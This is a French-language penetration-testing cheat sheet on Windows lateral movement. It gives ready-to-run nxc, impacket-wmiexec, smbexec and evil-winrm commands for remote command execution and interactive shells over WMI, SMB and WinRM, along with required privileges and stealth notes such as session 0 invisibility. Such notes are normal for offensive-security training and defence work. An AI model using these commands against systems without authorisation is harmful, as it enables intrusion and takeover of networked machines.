# Lateral Movement

## WMI

Exécute des processus à distance via `Win32_Process.Create`. Nécessite d'être membre du groupe **Administrators local** sur la cible (les domain users ne sont pas soumis aux restrictions UAC distantes).

**nxc / impacket-wmiexec (depuis Kali)**

```bash
# nxc
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami"
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method wmiexec

# impacket — shell interactif
impacket-wmiexec corp.com/<user>:<password>@<IP_CIBLE>
```

Ports utilisés par `wmiexec` :
- **135** (DCOM/RPC) — exécution de la commande via WMI
- **445** (SMB/ADMIN$) — récupération de l'output (fichier temporaire sur le partage admin)

Si seul le port **445** est disponible, utiliser `smbexec` — crée un service temporaire via SCM, sans passer par WMI : 
```bash
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
```

**PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`

> Les processus WMI sont créés en **session 0** (isolation système) — invisibles dans la session utilisateur active.

## WinRM

Protocole WS-Management sur TCP **5985** (HTTP) / **5986** (HTTPS). Nécessite d'être membre de **Administrators** ou **Remote Management Users** sur la cible.

**evil-winrm (shell interactif)**

```bash
evil-winrm -i <IP_CIBLE> -u <user> -p <password>
```

**nxc (exécution de commande)**

```bash
nxc winrm <IP_CIBLE> -u <user> -p <password> -X "whoami"
```

**PowerShell (Windows)** : `Enter-PSSession`, `Invoke-Command`, `New-PSSession`

> WinRM souffre du **Kerberos Double Hop** — les credentials ne se propagent pas aux ressources réseau distantes depuis la session. Préférer WMI pour éviter ce problème.

